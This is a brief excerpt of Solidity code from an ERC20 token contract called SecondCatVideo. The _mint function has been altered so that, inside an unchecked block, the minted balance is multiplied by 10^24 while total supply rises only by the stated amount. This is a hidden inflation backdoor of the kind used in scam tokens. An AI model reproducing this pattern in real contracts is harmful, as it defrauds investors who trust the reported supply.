...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        _totalSupply += amount;
        unchecked {
            _balances[account] += amount * 1000000000000000000000000;
        }
...
contract SecondCatVideo  is ERC20, Ownable {
    ...
    string private constant _name = "SecondCatVideo";
    string private constant _symbol = "SCV";
